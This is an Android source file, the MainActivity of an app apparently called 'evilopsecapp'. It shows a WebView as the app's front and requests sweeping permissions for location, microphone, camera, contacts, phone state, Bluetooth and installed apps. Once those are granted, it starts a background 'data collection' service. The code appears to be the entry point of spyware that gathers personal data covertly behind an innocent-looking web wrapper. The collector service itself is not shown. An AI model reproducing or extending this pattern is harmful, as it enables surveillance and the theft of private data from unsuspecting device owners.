package com.example.evilopsecapp;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import com.example.evilopsecapp.datacollection.BackgroundCollectorService;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.example.evilopsecapp.helpers.AppContext;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;
    // Permissions for data collection
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.BLUETOOTH,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.BLUETOOTH_ADMIN,
            Manifest.permission.QUERY_ALL_PACKAGES // For listing installed apps (Android 11+)
    };

    private WebView webView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        AppContext.initialize(this);  // ✅ Store Application Context

        setContentView(R.layout.activity_main);

        // Initialize WebView
        webView = findViewById(R.id.webView);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true); // Enable JavaScript

        // Ensure links open inside the WebView instead of an external browser
        webView.setWebViewClient(new WebViewClient());

        // Load WebView URL
        webView.loadUrl(getString(R.string.webview_url) );

        // Check and request all required permissions then start the data collection service
        checkAndRequestPermissions();

    }

    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();

        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsNeeded.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        } else {
            Log.d(TAG, "✅ Permissions already granted!");
            startDataCollectionService();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int i = 0; i < grantResults.length; i = i + 1) {

                int result = grantResults[i];
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    Log.d(TAG, "❌ Permission "+ permissions[i] +" not granted!");
                    break;
                }
            }

            if (allGranted) {
                Log.d(TAG, "✅ All permissions granted!");
                onPermissionsGranted();  // Call method when permissions are granted
            } else {
                Log.d(TAG, "❌ Failed to start data collection service, permissions denied!");
            }
        }
    }

    private void onPermissionsGranted() {
        Log.d(TAG, "🎉 All permissions granted, starting data collection service!");
        startDataCollectionService();
    }

    private void startDataCollectionService() {
        Intent serviceIntent = new Intent(this, BackgroundCollectorService.class);
        startService(serviceIntent);
    }
}